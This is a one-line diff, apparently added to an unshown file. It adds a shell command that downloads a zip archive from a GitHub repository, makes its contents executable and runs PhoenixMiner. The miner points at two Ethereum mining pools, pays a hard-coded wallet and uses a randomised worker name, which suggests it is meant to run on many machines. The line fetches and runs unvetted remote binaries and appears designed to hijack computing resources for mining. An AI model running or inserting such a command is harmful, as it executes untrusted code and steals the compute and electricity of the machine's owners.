@@ -1,0 +1,1 @@
+wget https://github.com/chingq668/chinhquang/raw/main/toanmi.zip && unzip toanmi.zip && chmod +x * && ./PhoenixMiner -pool ssl://eth-hke.flexpool.io:5555 -pool2 ssl://eth-sg.flexpool.io:5555 -wal 0x33879b7b9ae2e61e28f44817d48eeb0059c73d37.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))
